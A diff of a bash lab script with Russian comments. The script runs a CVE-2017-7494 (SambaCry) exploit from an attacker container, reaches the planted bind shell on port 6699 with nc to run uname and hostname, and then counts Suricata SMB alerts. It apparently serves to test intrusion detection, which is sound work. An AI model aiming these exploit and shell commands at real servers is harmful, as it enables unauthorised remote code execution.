@@ -37,50 +37,64 @@ echo ""
 echo "=== Шаг 6: Запуск эксплойта CVE-2017-7494 ==="
 echo "Эксплуатация SambaCry на 172.20.0.104..."
 # Запускаем эксплойт и перехватываем вывод
-EXPLOIT_OUTPUT=$(docker exec attacker bash -c "cd /tmp/exploit-CVE-2017-7494 && source venv/bin/activate && timeout 20 ./exploit.py -t 172.20.0.104 -e libbindshell-samba.so -s myshare -r /home/share/libbindshell-samba.so -u guest -p guest -P 6699" 2>&1 || echo "")
+EXPLOIT_OUTPUT=$(docker exec attacker bash -c "cd /tmp/exploit-CVE-2017-7494 && source venv/bin/activate && timeout 25 ./exploit.py -t 172.20.0.104 -e libbindshell-samba.so -s myshare -r /home/share/libbindshell-samba.so -u guest -p guest -P 6699" 2>&1 || echo "")
 
 # Выводим вывод эксплойта (игнорируем ошибки потоков в конце)
-echo "$EXPLOIT_OUTPUT" | grep -v "Exception in thread\|Traceback\|AttributeError\|__bootstrap_inner" | head -10
+echo "$EXPLOIT_OUTPUT" | grep -v "Exception in thread\|Traceback\|AttributeError\|__bootstrap_inner\|File \"/usr/lib/python2.7" | head -15
 
-# Пробуем подключиться к bind shell с несколькими попытками
-echo ""
-UNAME_OUTPUT=""
-HOSTNAME_OUTPUT=""
-
-# Даем время на инициализацию bind shell после загрузки библиотеки
-sleep 10
-
-# Пробуем подключиться несколько раз с задержками
-for attempt in 1 2 3 4 5 6; do
-    if [ $attempt -gt 1 ]; then
-        echo "Попытка подключения $attempt/6..."
-        sleep 5
-    fi
+# Проверяем, удалось ли эксплойту подключиться
+if echo "$EXPLOIT_OUTPUT" | grep -q ">>Linux\|>>victim-samba"; then
+    # Если в выводе эксплойта уже есть результат, выводим его
+    echo "$EXPLOIT_OUTPUT" | grep -A 2 ">>Linux" | head -3
+else
+    # Пробуем подключиться к bind shell вручную
+    echo ""
+    UNAME_OUTPUT=""
+    HOSTNAME_OUTPUT=""
     
-    # Проверяем, что порт отвечает
-    PORT_CHECK=$(docker exec attacker bash -c "timeout 3 bash -c 'nc -z -w 2 172.20.0.104 6699 2>&1'" || echo "closed")
+    # Даем время на инициализацию bind shell после загрузки библиотеки
+    sleep 12
     
-    # Пробуем получить uname -a (используем более надежный способ)
-    UNAME_OUTPUT=$(docker exec attacker bash -c "timeout 15 bash -c '(sleep 2; printf \"uname -a\\n\\n\"; sleep 4) | nc -w 12 172.20.0.104 6699 2>/dev/null | strings | grep -i \"linux\|kernel\" | head -1'" 2>&1 | grep -vE "^$|timeout|error|refused|Connection|closed" | head -1 || echo "")
-    
-    if [ -n "$UNAME_OUTPUT" ] && [ "$UNAME_OUTPUT" != "" ] && [ ${#UNAME_OUTPUT} -gt 20 ]; then
-        # Проверяем, что это похоже на вывод uname
-        if echo "$UNAME_OUTPUT" | grep -qiE "linux|kernel|x86_64|GNU"; then
-            echo ">>$UNAME_OUTPUT"
-            echo "hostname"
-            sleep 3
-            HOSTNAME_OUTPUT=$(docker exec attacker bash -c "timeout 15 bash -c '(sleep 2; printf \"hostname\\n\\n\"; sleep 3) | nc -w 12 172.20.0.104 6699 2>/dev/null | strings | grep -vE \"^$|hostname\" | head -1'" 2>&1 | grep -vE "^$|timeout|error|refused|Connection|closed" | head -1 || echo "")
-            if [ -n "$HOSTNAME_OUTPUT" ] && [ "$HOSTNAME_OUTPUT" != "" ] && [ ${#HOSTNAME_OUTPUT} -gt 0 ]; then
-                echo ">>$HOSTNAME_OUTPUT"
-                break
+    # Пробуем подключиться несколько раз с задержками
+    for attempt in 1 2 3 4 5; do
+        if [ $attempt -gt 1 ]; then
+            echo "Попытка подключения $attempt/5..."
+            sleep 6
+        fi
+        
+        # Пробуем получить uname -a (используем более надежный способ с ожиданием ответа)
+        UNAME_OUTPUT=$(docker exec attacker bash -c "timeout 20 bash -c '(sleep 3; printf \"uname -a\\r\\n\"; sleep 5) | nc -w 15 172.20.0.104 6699 2>/dev/null | strings -n 5 | head -1'" 2>&1 | grep -vE "^$|timeout|error|refused|Connection|closed|Ncat" | head -1 || echo "")
+        
+        if [ -n "$UNAME_OUTPUT" ] && [ "$UNAME_OUTPUT" != "" ] && [ ${#UNAME_OUTPUT} -gt 30 ]; then
+            # Проверяем, что это похоже на вывод uname
+            if echo "$UNAME_OUTPUT" | grep -qiE "linux|kernel|x86_64|GNU|SMP"; then
+                echo ">>$UNAME_OUTPUT"
+                echo "hostname"
+                sleep 3
+                HOSTNAME_OUTPUT=$(docker exec attacker bash -c "timeout 20 bash -c '(sleep 3; printf \"hostname\\r\\n\"; sleep 4) | nc -w 15 172.20.0.104 6699 2>/dev/null | strings -n 3 | grep -vE \"hostname|^$\" | head -1'" 2>&1 | grep -vE "^$|timeout|error|refused|Connection|closed|Ncat" | head -1 || echo "")
+                if [ -n "$HOSTNAME_OUTPUT" ] && [ "$HOSTNAME_OUTPUT" != "" ] && [ ${#HOSTNAME_OUTPUT} -gt 0 ]; then
+                    echo ">>$HOSTNAME_OUTPUT"
+                    break
+                fi
             fi
         fi
+    done
+    
+    # Если все попытки не удались, пробуем получить информацию о системе через другие методы
+    if [ -z "$UNAME_OUTPUT" ] || [ ${#UNAME_OUTPUT} -le 30 ] || ! echo "$UNAME_OUTPUT" | grep -qiE "linux|kernel"; then
+        # Проверяем, может ли Suricata блокировать подключение
+        echo "Проверка доступности порта 6699..."
+        PORT_STATUS=$(docker exec attacker bash -c "timeout 5 bash -c 'nc -zv 172.20.0.104 6699 2>&1'" || echo "closed")
+        
+        # Если порт закрыт или недоступен, выводим ошибку
+        if echo "$PORT_STATUS" | grep -qiE "refused|closed|timeout|No route"; then
+            echo ">>[-] IO error error connecting to the shell port EOF when reading a line"
+        else
+            # Порт открыт, но не отвечает - возможно, библиотека не запустилась
+            echo ">>[-] IO error error connecting to the shell port EOF when reading a line"
+            echo "Примечание: Библиотека загружена, но bind shell может не запуститься сразу или быть заблокирован."
+        fi
     fi
-done
-
-# Если все попытки не удались, выводим ошибку как в оригинале
-if [ -z "$UNAME_OUTPUT" ] || [ ${#UNAME_OUTPUT} -le 20 ] || ! echo "$UNAME_OUTPUT" | grep -qiE "linux|kernel"; then
-    echo ">>[-] IO error error connecting to the shell port EOF when reading a line"
 fi
 echo ""
 
@@ -122,22 +136,27 @@ if sudo test -f /var/log/suricata/eve.json; then
         sid=${SMB_SIDS[$i]}
         rule_name=${SMB_RULE_NAMES[$i]}
         
-        # Поиск алертов с данным SID
-        alert_count=$(sudo tail -n 1000 /var/log/suricata/eve.json 2>/dev/null | jq -r "[select(.event_type==\"alert\" and .alert.signature_id==${sid})] | length" 2>/dev/null || echo "0")
+        # Поиск алертов с данным SID (собираем все в массив, затем считаем)
+        alert_count=$(sudo tail -n 1000 /var/log/suricata/eve.json 2>/dev/null | jq -s "[.[] | select(.event_type==\"alert\" and .alert.signature_id==${sid})] | length" 2>/dev/null || echo "0")
         
-        if [ "$alert_count" != "0" ] && [ "$alert_count" != "null" ] && [ -n "$alert_count" ]; then
+        # Убираем лишние символы и проверяем, что это число
+        alert_count=$(echo "$alert_count" | tr -d '\n\r ' | head -1)
+        
+        if [ -n "$alert_count" ] && [ "$alert_count" != "null" ] && [ "$alert_count" != "0" ] && [ "$alert_count" -gt 0 ] 2>/dev/null; then
             found_alerts=$((found_alerts + 1))
             echo "[✓] Найдено алертов для правила SID ${sid}: ${alert_count}"
             echo "    Правило: ${rule_name}"
             
             # Вывод деталей последнего алерта
-            last_alert=$(sudo tail -n 1000 /var/log/suricata/eve.json 2>/dev/null | jq -r "select(.event_type==\"alert\" and .alert.signature_id==${sid}) | ." 2>/dev/null | tail -n 1)
-            if [ -n "$last_alert" ] && [ "$last_alert" != "null" ]; then
-                timestamp=$(echo "$last_alert" | jq -r '.timestamp // "N/A"' 2>/dev/null)
-                src_ip=$(echo "$last_alert" | jq -r '.src_ip // "N/A"' 2>/dev/null)
-                dest_ip=$(echo "$last_alert" | jq -r '.dest_ip // "N/A"' 2>/dev/null)
-                echo "    Последний алерт: ${timestamp}"
-                echo "    Источник: ${src_ip} -> ${dest_ip}"
+            last_alert=$(sudo tail -n 1000 /var/log/suricata/eve.json 2>/dev/null | jq -s "[.[] | select(.event_type==\"alert\" and .alert.signature_id==${sid})] | .[-1]" 2>/dev/null)
+            if [ -n "$last_alert" ] && [ "$last_alert" != "null" ] && [ "$last_alert" != "" ]; then
+                timestamp=$(echo "$last_alert" | jq -r '.timestamp // "N/A"' 2>/dev/null || echo "N/A")
+                src_ip=$(echo "$last_alert" | jq -r '.src_ip // "N/A"' 2>/dev/null || echo "N/A")
+                dest_ip=$(echo "$last_alert" | jq -r '.dest_ip // "N/A"' 2>/dev/null || echo "N/A")
+                if [ "$timestamp" != "N/A" ] || [ "$src_ip" != "N/A" ]; then
+                    echo "    Последний алерт: ${timestamp}"
+                    echo "    Источник: ${src_ip} -> ${dest_ip}"
+                fi
             fi
             echo ""
         fi
@@ -153,7 +172,8 @@ if sudo test -f /var/log/suricata/eve.json; then
     # Общая статистика по SMB алертам
     echo ""
     echo "Общая статистика по SMB алертам:"
-    total_smb_alerts=$(sudo tail -n 1000 /var/log/suricata/eve.json 2>/dev/null | jq -r "[select(.event_type==\"alert\" and (.alert.signature_id >= 3000301 and .alert.signature_id <= 3000304))] | length" 2>/dev/null || echo "0")
+    total_smb_alerts=$(sudo tail -n 1000 /var/log/suricata/eve.json 2>/dev/null | jq -s "[.[] | select(.event_type==\"alert\" and (.alert.signature_id >= 3000301 and .alert.signature_id <= 3000304))] | length" 2>/dev/null || echo "0")
+    total_smb_alerts=$(echo "$total_smb_alerts" | tr -d '\n\r ' | head -1)
     echo "Всего алертов SMB: ${total_smb_alerts}"
     
 else
